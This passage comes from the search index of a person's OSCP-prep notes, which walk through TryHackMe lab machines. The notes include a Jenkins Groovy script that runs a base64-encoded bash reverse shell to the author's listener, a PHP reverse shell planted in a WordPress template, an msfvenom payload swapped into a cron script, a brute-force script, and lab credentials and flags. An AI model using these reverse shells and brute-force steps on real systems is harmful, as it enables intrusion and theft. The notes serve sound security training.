linux/remote/45124.rb\nvBulletin 4.x - breadcrumbs via xmlrpc API (Authenticated) SQL Injection                                                                                   | php/webapps/40115.py\nvBulletin 4.x/5.x - AdminCP/ApiLog via xmlrpc API (Authenticated) Persistent Cross-Site Scripting                                                          | php/webapps/40114.py\nWordPress Core 1.5.1.2 - 'xmlrpc' Interface SQL Injection                                                                                                  | php/webapps/1077.pl\nWordPress Core 2.1.2 - 'xmlrpc' SQL Injection                                                                                                              | php/webapps/3656.pl\nWordPress Core 2.2 - 'xmlrpc.php' SQL Injection                                                                                                            | php/webapps/4039.txt\nWordPress Core &lt; 5.3.x - 'xmlrpc.php' Denial of Service                                                                                                    | php/dos/47800.py\nXML-RPC Library 1.3.0 - 'xmlrpc.php' Arbitrary Code Execution (Metasploit)                                                                                 | php/webapps/16882.rb\nXML-RPC Library 1.3.0 - 'xmlrpc.php' Remote Code Injection                                                                                                 | php/webapps/1078.pl\nXML-RPC Library 1.3.0 - 'xmlrpc.php' Remote Command Execution (2)                                                                                          | php/webapps/1083.pl\nXML-RPC Library 1.3.0 - 'xmlrpc.php' Remote Command Execution (3)                                                                                          | php/webapps/1084.pl\nXOOPS 2.0.11 - 'xmlrpc.php' SQL Injection                                                                                                                  | php/webapps/1082.pl\nYukihiro Matsumoto Ruby 1.x - XMLRPC Server Denial of Service                                                                                              | linux/dos/27723.txt\n----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/internal/#wordpress-readme-found-httpinternalthmblogreadmehtml","title":"WordPress readme found: <code>http://internal.thm/blog/readme.html</code>","text":"<p>System requirements are laid out in the readme. </p>"},{"location":"OSCP-Prep/TryHackMe/internal/#wordpress-version-542","title":"WordPress version <code>5.4.2</code>","text":"<p>https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#panel-rce</p>"},{"location":"OSCP-Prep/TryHackMe/internal/#wordpress-theme-twentyseventeen-v-23-80","title":"WordPress theme <code>twentyseventeen v 2.3 (80%)</code>","text":"<p>Login Page </p>"},{"location":"OSCP-Prep/TryHackMe/internal/#username-disclosure","title":"Username disclosure","text":"<p>found username <code>admin</code> on blog post </p> <p>Forgot password can be brute forced to check for valid users invalid username valid username  Powershell to bruteforce</p> <pre><code>$validUsers = [System.collections.arraylist]::new(); $usernames | %{                                                             \n&gt;&gt; $user = $_;                                                 \n&gt;&gt; $body = \"user_login=$user&amp;redirect_to=&amp;wp-submit=Get+New+Password\";                                      \n&gt;&gt; $r = Invoke-RestMethod -Method POST -Uri $url -Body $body;  \n&gt;&gt; if($r -like \"*no account*\"){Write-Host -ForegroundColor Red $user}else{Write-Host -ForegroundColor Green $user; $validUsers.Add($user)&gt;$null;}                                 \n&gt;&gt;      $validUsers                                                 \n&gt;&gt; }\n</code></pre> <p>ZAP bruteforce with username: admin passwordfile: rockyou.txt </p>"},{"location":"OSCP-Prep/TryHackMe/internal/#wordpress-login","title":"Wordpress Login","text":"<p>Username: <code>admin</code> Password: <code>my2boys</code></p> <p>Following this Guide: https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#panel-rce 1. Go to Dashboard &gt; Appearance &gt; Theme Editor &gt; 404 Template 2. Paste the contents of a php reverse shell - using /usr/share/webshells/php/php-reverse-shell.php for this test.     1. Change lines 49 and 50 to reflect your shell listener.      3. Load the 404 page.     1. URL <code>http://internal.thm/blog/index.php/2020/08/03/6/</code></p> <p>Caught the shell with netcat.</p> <pre><code>\u2514\u2500$ nc -nvlp 4455           \nlistening on [any] 4455 ...\nconnect to [10.2.73.217] from (UNKNOWN) [10.10.251.234] 58026\nLinux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n 21:13:57 up 52 min,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami\nwww-data\n$ \n</code></pre> <p>www-data has nearly no permissions, but he can read /etc/passwd</p> <pre><code>$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nlxd:x:105:65534::/var/lib/lxd/:/bin/false\nuuidd:x:106:110::/run/uuidd:/usr/sbin/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1::/var/cache/pollinate:/bin/false\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\naubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash\nmysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false\n</code></pre> <p>Linux Kernel</p> <pre><code>$ uname -a\nLinux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n</code></pre> <p>Searchsploit</p> <pre><code>$ searchsploit Linux Kernel 4.15\n----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                             |  Path\n----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nLinux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 &lt; 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privilege Escalation (5)                      | linux/local/9479.c\nLinux Kernel 2.6.19 &lt; 5.9 - 'Netfilter Local Privilege Escalation                                                                                          | linux/local/50135.c\nLinux Kernel 4.10 &lt; 5.1.17 - 'PTRACE_TRACEME' pkexec Local Privilege Escalation                                                                            | linux/local/47163.c\nLinux Kernel 4.15.x &lt; 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (cron Method)                                                        | linux/local/47164.sh\nLinux Kernel 4.15.x &lt; 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (dbus Method)                                                        | linux/local/47165.sh\nLinux Kernel 4.15.x &lt; 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (ldpreload Method)                                                   | linux/local/47166.sh\nLinux Kernel 4.15.x &lt; 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (polkit Method)                                                      | linux/local/47167.sh\nLinux Kernel 4.8.0 UDEV &lt; 232 - Local Privilege Escalation                                                                                                 | linux/local/41886.c\nLinux Kernel &lt; 4.15.4 - 'show_floppy' KASLR Address Leak                                                                                                   | linux/local/44325.c\nLinux Kernel &lt; 4.16.11 - 'ext4_read_inline_data()' Memory Corruption                                                                                       | linux/dos/44832.txt\nLinux Kernel &lt; 4.17-rc1 - 'AF_LLC' Double Free                                                                                                             | linux/dos/44579.c\n----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n</code></pre> <pre><code>$ cat /etc/issue\nUbuntu 18.04.4 LTS \\n \\l\n$ searchsploit ubuntu 18.04   \n----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                             |  Path\n----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nUbuntu 18.04 - 'lxd' Privilege Escalation                                                                                                                  | linux/local/46978.sh\n----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n</code></pre> <p></p>"},{"location":"OSCP-Prep/TryHackMe/internal/#codemirror-540","title":"CodeMirror 5.4.0","text":""},{"location":"OSCP-Prep/TryHackMe/internal/#mysql","title":"MySQL","text":""},{"location":"OSCP-Prep/TryHackMe/internal/#might-be-useful-later","title":"Might be useful later.","text":"<p>Remediation - https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#panel-rce</p>"},{"location":"OSCP-Prep/TryHackMe/internal/#cves-found-by-linpeas","title":"CVEs found by LinPEAS","text":""},{"location":"OSCP-Prep/TryHackMe/internal/#cve-2021-3156","title":"CVE-2021-3156","text":"<p>Sudo before 1.9.5p2 contains an off-by-one error that can result in a heap-based buffer overflow, which allows privilege escalation to root via \"sudoedit -s\" and a command-line argument that ends with a single backslash character.  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156 https://packetstormsecurity.com/files/161230/Sudo-Buffer-Overflow-Privilege-Escalation.html</p>"},{"location":"OSCP-Prep/TryHackMe/internal/#cve-2021-22555","title":"CVE-2021-22555","text":"<p>A heap out-of-bounds write affecting Linux since v2.6.19-rc1 was discovered in net/netfilter/x_tables.c. This allows an attacker to gain privileges or cause a DoS (via heap memory corruption) through user name space https://packetstormsecurity.com/files/163878/Kernel-Live-Patch-Security-Notice-LSN-0080-1.html</p>"},{"location":"OSCP-Prep/TryHackMe/internal/#cve-2019-7304","title":"CVE-2019-7304","text":"<p>Canonical snapd before version 2.37.1 incorrectly performed socket owner validation, allowing an attacker to run arbitrary commands as root. This issue affects: Canonical snapd versions prior to 2.37.1. https://www.exploit-db.com/exploits/46361</p>"},{"location":"OSCP-Prep/TryHackMe/internal/#cve-2019-18634","title":"CVE-2019-18634","text":"<p>In Sudo before 1.8.26, if pwfeedback is enabled in /etc/sudoers, users can trigger a stack-based buffer overflow in the privileged sudo process. (pwfeedback is a default setting in Linux Mint and elementary OS; however, it is NOT the default for upstream and many other packages, and would exist only if enabled by an administrator.) The attacker needs to deliver a long string to the stdin of getln() in tgetpass.c. http://www.openwall.com/lists/oss-security/2020/02/05/5</p>"},{"location":"OSCP-Prep/TryHackMe/internal/#cve-2019-15666","title":"CVE-2019-15666","text":"<p>An issue was discovered in the Linux kernel before 5.0.19. There is an out-of-bounds array access in __xfrm_policy_unlink, which will cause denial of service, because verify_newpolicy_info in net/xfrm/xfrm_user.c mishandles directory validation.</p>"},{"location":"OSCP-Prep/TryHackMe/internal/#cve-2018-18955","title":"CVE-2018-18955","text":"<p>In the Linux kernel 4.15.x through 4.19.x before 4.19.2, map_write() in kernel/user_namespace.c allows privilege escalation because it mishandles nested user namespaces with more than 5 UID or GID ranges. A user who has CAP_SYS_ADMIN in an affected user namespace can bypass access controls on resources outside the namespace, as demonstrated by reading /etc/shadow. This occurs because an ID transformation takes place properly for the namespaced-to-kernel direction but not for the kernel-to-namespaced direction. https://www.exploit-db.com/exploits/45886/</p>"},{"location":"OSCP-Prep/TryHackMe/internal/#cve-2017-5618","title":"CVE-2017-5618","text":"<p>GNU screen before 4.5.1 allows local users to modify arbitrary files and consequently gain root privileges by leveraging improper checking of logfile permissions. http://www.openwall.com/lists/oss-security/2017/01/29/3</p>"},{"location":"OSCP-Prep/TryHackMe/internal/#cve-2017-0358","title":"CVE-2017-0358","text":"<p>Jann Horn of Google Project Zero discovered that NTFS-3G, a read-write NTFS driver for FUSE, does not scrub the environment before executing modprobe with elevated privileges. A local user can take advantage of this flaw for local root privilege escalation. https://www.exploit-db.com/exploits/41356</p>"},{"location":"OSCP-Prep/TryHackMe/internal/#cve-2011-1485","title":"CVE-2011-1485","text":"<p>Race condition in the pkexec utility and polkitd daemon in PolicyKit (aka polkit) 0.96 allows local users to gain privileges by executing a setuid program from pkexec, related to the use of the effective user ID instead of the real user ID.</p>"},{"location":"OSCP-Prep/TryHackMe/internal/#back-to-hackin","title":"Back to hackin","text":"<p>I got into phpMyAdmin with user <code>wordpress</code> pass <code>wordpress123</code></p> <p>admin user <code>phpmyadmin</code> pass <code>B2Ud4fEOZmVq</code></p>"},{"location":"OSCP-Prep/TryHackMe/internal/#check-out-williams-account","title":"Check out William's Account","text":"<p>user</p> <pre><code>william\n</code></pre> <p>pass</p> <pre><code>arnold147\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/internal/#internal-jenkins","title":"Internal: Jenkins","text":"<p>Found out Jenkins is running on 8080. I did some SSH remote forwarding and am able to access Jenkins.</p> <pre><code>ssh -N -R 10.2.73.217:8080:127.0.0.1:8080 nate@10.2.73.217\n</code></pre> <p></p>"},{"location":"OSCP-Prep/TryHackMe/internal/#privesc","title":"PrivEsc","text":"<p>After reviewing the privesc materials again, I'm confident the exploit will either be</p> <ul> <li>Some internal only port</li> </ul> <p></p> <ul> <li>Some other foothold that grants higher level than <code>www-data</code></li> <li>A kernel exploit  </li> </ul> <p>I decided to brute force Jenkins.</p> <p>The header size changed here, at the password <code>spongebob</code></p> <p>It worked!</p> <p>Jenkins Login User <code>Admin</code> Pass <code>spongebob</code></p> <p>Using this script but changed out the base64 payload with my details</p> <p></p> <p>Here's the full script</p> <pre><code>def sout = new StringBuffer(), serr = new StringBuffer()                                                          def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yLjczLjIxNy80NDQ0IDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()                                                                                                proc.consumeProcessOutput(sout, serr)                                                                             proc.waitForOrKill(1000)                                                                                          println \"out&gt; $sout err&gt; $serr\"\n</code></pre> <p>Got a shell and did full enumeration of Jenkins. Turns out Jenkins was running in a docker container. There didn't seem to be an easy way to break out. Nothing that applied to the mission (no ssh public keys, etc.)</p> <p>I went back to searching for Kernel Exploits. I was able to get full root with CVE-2021-3493</p> <p></p> <p>I was able to get the user and root flag. Case closed....sort of.</p> <p>The root flag contained <code>docker destroyer</code> which means I should probably learn docker and docker breakout some day. I just got lucky and found a recent exploit that wasn't patched in this room.</p>"},{"location":"OSCP-Prep/TryHackMe/overpass2hacked/","title":"Overpass2hacked","text":"<p>Examine capture file Copy hashes from /etc/shadow for offline cracking with fasttrack.txt in john ound 4 passwords     \u2022 secret12         (bee)     \u2022 abcd123          (szymex)     \u2022 1qaz2wsx         (muirland) secuirty3        (paradox)</p>"},{"location":"OSCP-Prep/TryHackMe/overpass2hacked/#initial-access","title":"Initial access","text":"<p>The hacker left a backdoor on SSH port 2222 Username: <code>james</code> Password:<code>november16</code></p> <p></p>"},{"location":"OSCP-Prep/TryHackMe/overpass2hacked/#enumeration","title":"Enumeration","text":""},{"location":"OSCP-Prep/TryHackMe/overpass2hacked/#got-kernel-version","title":"Got kernel version","text":"<pre><code>uname -a\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/overpass2hacked/#search-for-linux-kernel-415-exploits","title":"search for Linux Kernel 4.15 exploits","text":"<pre><code>$ searchsploit linux 4.15\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/overpass2hacked/#look-around-the-file-system","title":"Look around the file system","text":""},{"location":"OSCP-Prep/TryHackMe/overpass2hacked/#abusing-suid_bash","title":"Abusing .suid_bash","text":"<pre><code>james@overpass-production:/home/james$ ./.suid_bash -p\n.suid_bash-4.4# whoami\nroot\n.suid_bash-4.4# cd /root\n.suid_bash-4.4# ls\nroot.txt\n.suid_bash-4.4# cat root.txt\nthm{d53b2684f169360bb9606c333873144d}\n</code></pre> <p>root flag <code>thm{d53b2684f169360bb9606c333873144d}</code></p>"},{"location":"OSCP-Prep/TryHackMe/steelmountain/","title":"Steelmountain","text":"<p>Started taking notes on this one kind of late. So far I've scanned, enumerated, and rooted with metasploit.</p>"},{"location":"OSCP-Prep/TryHackMe/steelmountain/#access-and-root-without-metasploit","title":"Access and root without metasploit","text":"<p>Will be using 39161.py to exploit.</p> <pre><code>searchsploit -m 39161.py\n</code></pre> <p>Instructions say to run</p> <pre><code>Python3 ./39161.py &lt;ip&gt;\n</code></pre> <p>![[8a28e9be040b4ca5bed474df56a30b7e.jpg]]</p>"},{"location":"OSCP-Prep/TryHackMe/tomghost/","title":"Tomghost","text":""},{"location":"OSCP-Prep/TryHackMe/tomghost/#recon","title":"Recon","text":"<p>Based on the name it appears to be Apache Tomcat related. The username contains a swear word.</p>"},{"location":"OSCP-Prep/TryHackMe/tomghost/#scanning","title":"Scanning","text":"<pre><code>PORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n53/tcp   open  tcpwrapped\n8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)\n8080/tcp open  http       Apache Tomcat 9.0.30\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/tomghost/#enumerating-external-services","title":"Enumerating external services","text":""},{"location":"OSCP-Prep/TryHackMe/tomghost/#8080-apache-tomcat-9030-default-configuration","title":"8080 - Apache Tomcat 9.0.30, default configuration","text":"<p>![[cb107eef217c4d25ba2f329c17839004]]</p>"},{"location":"OSCP-Prep/TryHackMe/tomghost/#weaponization","title":"Weaponization","text":"<p>This looks promising given the circumstances. ![[10dfa5e248f3439bba1150544d1d0149]] Loot from that exploit ![[66fce28faa1043f5a01f2fba965268ba]] user: <code>skyfuck</code> pass: <code>8730281lkjlkjdqlksalks</code></p> <p>Those creds worked for SSH ![[5df9e7ae0e2c4e82b92609bd3220a250]] users ![[95c5c24ce16f4928a6e563df06b98df9]] User flag <code>THM{GhostCat_1s_so_cr4sy}</code> ![[147b615eed7d42feab2a814435a76cae]]</p> <p>Upload and run linpeas ![[c34aeb9fcb1845d6a4cce59b28c35361]]</p> <p>Found an SSH private key? ![[08acb0f4a1ae422b81263a5e657455ff]] ![[82cbdc81dcd34819a8653bd738a082d9]]</p> <p>Looks like we need to log in as root using the private key.</p> <p>Port 8005 is only available from the inside. ![[e7cf94e7cca04d3b8289abb5f54235e8]]</p> <p>Not sure what this is ![[3f1ed64670824d8aa4275cbd7ffebd39]]</p>"},{"location":"OSCP-Prep/TryHackMe/tomghost/#going-to-try-cracking-the-passphrase-for-pgp-private-key","title":"Going to try cracking the passphrase for PGP private key.","text":"<p>First send it through gpg2john ![[041666ac7efa49c4a9cff0444ac8b092]] Then use john to crack ![[e7a72984499946b5bb8a44b715abe55a]]</p> <p>Cracked in record time when I switched to rockyou.txt! ![[001f34ebb80b4cd9823f2befcdaca6ae]]</p> <p>file: <code>tryhackme</code> pass: <code>alexandru</code></p>"},{"location":"OSCP-Prep/TryHackMe/tomghost/#import-the-pgp-key","title":"Import the pgp key","text":"<p>![[968a427301084bd686b8523918aa82ac]]</p>"},{"location":"OSCP-Prep/TryHackMe/tomghost/#decrypt-the-credential","title":"Decrypt the credential","text":"<p>![[2c47147ea5ca456f8db2481192da7253]]</p> <p>Logged in as merlin, I have sudo privs for zip. GTFObins gave me root shell https://gtfobins.github.io/gtfobins/zip/ ![[6aee0a72ac87482b836f2bae68b22254]]</p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Anonymous/","title":"Anonymous","text":"<p>Port scan showed that FTP was open. I was able to connect with user <code>anonymous</code> and password <code>anonymous</code>. There was a message about Passive mode when logging in, and from past experience I know I need to force active mode to download/upload anyting:</p> <pre><code>ftp &lt;IP&gt; -A\n</code></pre> <p>It looks like I have write permissions to a script <code>clean.sh</code> which appears to be running on a schedule.</p> <p>I replaced the script with a reverse shell and am waiting with a listener.</p> <pre><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.2.73.217 LPORT=4444 -f sh -o clean.sh\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/BufferOverFlowPrep/","title":"BufferOverFlowPrep","text":"<p>This room is a nice practice zone for buffer overflow exploit development. I've already completed the first two tasks which include launching the VM and a buffer overflow leveraging <code>mona</code> in immunity debugger to increase speed.</p> <p>I see a lot of automation potential in the exploit provided in task 2. So I will use this series to come up with a toolset to automate this crap so I never have to do it again.</p> <p>Initially I was going to document my journey as I developed the tool, but it was too much extra work. Here's the code. Only runs on linux and <code>xclip</code> required. It could easily be ported to Windows, just need to change the functions that access clipboard. </p> <p>LMK if you have any questions!</p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Ice/","title":"Ice","text":"<p>This box is an introductory Windows box.</p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Ice/#services","title":"Services","text":"<p>The tryhackme room is a walktrhough. We're focused on port 8000 which has <code>icecast</code> running.</p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Ice/#vulnerability","title":"Vulnerability","text":"<p>CVE-2004-1561 provides code execution through buffer overflow.</p> <p>Recommended to use metasploit. It was pretty simple and mostly worked as is.</p> <p><code>windows/http/icecast_header</code> is used as the initial foothold. Then we used exploit_suggester to find <code>windows/local/bypassuac_eventvwr</code>. The privesc exploit kept failing so I finally decided to migrate to an x64 system process (explorer.exe) and fire the exploit with x64 as the target. This gave me a successful privesc.</p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/dogcat/","title":"Dogcat","text":"<p>The only open ports on this one are SSH(22) and HTTP(80).</p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/dogcat/#webserver","title":"Webserver","text":"<p>I was checking out the webserver and was able to trigger an error which seems to hint toward LFI vulnerability. My suspicion is based on this URL <code>http://10.10.226.6/?view=dog../../../../etc/passwd</code></p> <p>Which produced this error on the webpage</p> <p>Warning: include(dog../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24</p> <p>Warning: include(): Failed opening 'dog../../../../etc/passwd.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24</p> <p>I tried many methods to read <code>/etc/passwd</code> but was unsuccessful. Next step is to throw an LFI list using something like dirbuster or ZAP</p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/relevant/","title":"Relevant","text":""},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/relevant/#recon","title":"Recon","text":""},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/relevant/#flags","title":"Flags:","text":"<ul> <li>user.txt</li> <li>root.txt</li> </ul>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/relevant/#rules","title":"Rules:","text":"<ol> <li>Manual exploitation preferred.</li> <li>Locate/note all vulns found.</li> <li>Submit flags to dashboard.</li> <li>Stay in scope - stick to the room's box.</li> <li>Find and report ALL vulnerabilities.</li> </ol>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/relevant/#nmap-scan","title":"nmap scan","text":"<pre><code>\u2514\u2500$ nmap -sV -T5 10.10.89.145 | tee quickscan\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:29 CDT\nNmap scan report for 10.10.89.145\nHost is up (0.21s latency).\nNot shown: 995 filtered tcp ports (no-response)\n\nPORT     STATE SERVICE            VERSION\n80/tcp   open  http               Microsoft IIS httpd 10.0 (SSDP/UPnP)\n135/tcp  open  msrpc              Microsoft Windows RPC\n139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds\n3389/tcp open  ssl/ms-wbt-server?\n49663/tcp open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0                                            49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC                                               49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC\n\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 100.75 seconds\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/relevant/#service-enumeration","title":"Service Enumeration","text":"<p>For the service enumeration, a more thorough scan was needed.</p> <pre><code>nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN full_tcp_nmap.txt 10.10.89.145\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/relevant/#80-iis-100","title":":80 - IIS 10.0","text":"<ul> <li>X-Powered-By: ASP.NET </li> </ul>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/relevant/#135-microsoft-windows-rpc","title":":135 - Microsoft Windows RPC","text":"<p>Many services exposed via RCP.</p> <pre><code>Provider: appinfo.dll\nProvider: BFE.DLL\nProvider: certprop.dll\nProvider: dhcpcsvc.dll\nProvider: dhcpcsvc6.dll\nProvider: gpsvc.dll\nProvider: iphlpsvc.dll\nProvider: MPSSVC.dll\nProvider: msdtcprx.dll\nProvider: N/A\nProvider: nrpsrv.dll\nProvider: nsisvc.dll\nProvider: pcasvc.dll\nProvider: samsrv.dll\nProvider: schedsvc.dll\nProvider: services.exe\nProvider: spoolsv.exe\nProvider: sppsvc.exe\nProvider: srvsvc.dll\nProvider: ssdpsrv.dll\nProvider: sysntfy.dll\nProvider: taskcomp.dll\nProvider: wevtsvc.dll\nProvider: wininit.exe\nProvider: winlogon.exe\nUUID    : FAF2447B-B348-4FEB-8DBE-BEEE5B7F7778 v1.0 OnlineProviderCert RPC Interface\nProtocol: [MS-CMPO]: MSDTC Connection Manager:\nProtocol: [MS-EVEN6]: EventLog Remoting Protocol\nProtocol: [MS-PAN]: Print System Asynchronous Notification Protocol\nProtocol: [MS-PAR]: Print System Asynchronous Remote Protocol\nProtocol: [MS-RPRN]: Print System Remote Protocol\nProtocol: [MS-RSP]: Remote Shutdown Protocol\nProtocol: [MS-SAMR]: Security Account Manager (SAM) Remote Protocol\nProtocol: [MS-SCMR]: Service Control Manager Remote Protocol\nProtocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol\n</code></pre>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/relevant/#139-microsoft-windows-netbios-ssn","title":":139 - Microsoft Windows netbios-ssn","text":"<p>nothing worth noting.</p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/relevant/#445-windows-server-2016-standard-evaluation-14393-microsoft-ds","title":":445 - Windows Server 2016 Standard Evaluation 14393 microsoft-ds","text":"<p>Using smb the Guest can read \\10.10.89.145\\nt4wrksv\\passwords.txt passwords.txt <code>$ smbclient //10.10.67.66/nt4wrksv -U Guest</code> Password is <code></code> (nothing) copied the files locally <code>get passwords.txt</code>  Decode the password</p> <pre><code>$ echo \"Qm9iIC0gIVBAJCRXMHJEITEyMw==\" | base64 --decode\nBob - !P@$$W0rD!123 \n\n$ echo \"QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk\" | base64 --decode               \nBill - Juw4nnaM4n420696969!$$$\n</code></pre> <p>Username: </p> <pre><code>Bob\n</code></pre> <p>Password: </p> <pre><code>!P@$$W0rD!123\n</code></pre> <p>Username: </p> <pre><code>Bill\n</code></pre> <p>Password: </p> <pre><code>Juw4nnaM4n420696969!$$$\n</code></pre> <p>Wonder what those credentials are for? Check these Vulnerabilities </p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/relevant/#3389-microsoft-terminal-services","title":":3389 - Microsoft Terminal Services","text":"<p>Rdp, not much about it on there. Credentials didn't work with RDP.</p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/relevant/#49663-iis-100","title":":49663 - IIS  10.0","text":"<p>X-Powered-By: ASP.NET  page never loads in browser</p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/relevant/#os-guess","title":"OS Guess:","text":""},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/relevant/#windows-server-2008-r2","title":"Windows Server 2008 R2","text":"<p>You're my boy Blue! </p>"},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/relevant/#windows-server-2016-standard-evaluation-14393-windows-server-2016-standard-evaluation-63","title":"Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)","text":""},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/relevant/#microsoft-windows-server-2016-90","title":"Microsoft Windows Server 2016 (90%)","text":""},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/relevant/#weaponization","title":"Weaponization","text":""},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/10.200.70.138%20Throwback-FW01/","title":"Throwback-FW01","text":""},{"location":"OSCP-Prep/TryHackMe/Work%20in%20Progress/Throwback/10.200.70.138%20Throwback-FW01/#open-ports","title":"Open ports","text":"<pre><code>22/tcp  open  ssh     syn-ack ttl 63 OpenSSH 7.5 (protocol 2.0)\n53/tcp  open  domain  syn-ack ttl 63 (generic dns response: REFUSED)\n80/tcp  open  http    syn-ack ttl 63 nginx   \n443/tcp open  https   syn-ack ttl 63 nginx \n</code></pre> <p>pfsense was running with default credentials <code>admin:pfsense</code></p> <p>using diagnostics &gt; command prompt we are able to get a reverse shell as root with the pentest 